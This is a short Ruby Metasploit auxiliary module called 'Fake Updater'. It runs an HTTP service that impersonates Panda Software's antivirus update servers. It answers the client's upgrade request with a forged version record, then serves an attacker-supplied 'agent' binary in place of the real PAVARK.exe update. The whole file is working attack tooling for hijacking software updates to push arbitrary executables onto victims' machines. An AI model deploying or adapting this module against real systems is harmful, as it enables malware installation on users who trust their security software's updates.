require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake  Updater',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
			], self.class)
		
		@base = {	
			'vh' => ['acs.pandasoftware.com','suspects.pandasoftware.com'],
			'request' => [{
                                'req' => '/upglitenv/tucan/Upgrade.phtml',
                                'type' => 'string',
                                'string' => "lastversion=5.0.0.20\nurl=http://acs.pandasoftware.com/upglite/tucan/PAVARK.exe\nlicense=5.0.0.0"
			},{
				'req' => '/rootkits/sendfile.aspx',
				'type' => 'string',
				'string' => 'foo'
                        },{
                                'req' => '/upglite/tucan/PAVARK.exe',
                                'type' => 'agent',
                                'bin'    => 1,
                        }
			],
			'options' => {
			}
		}
	end
end
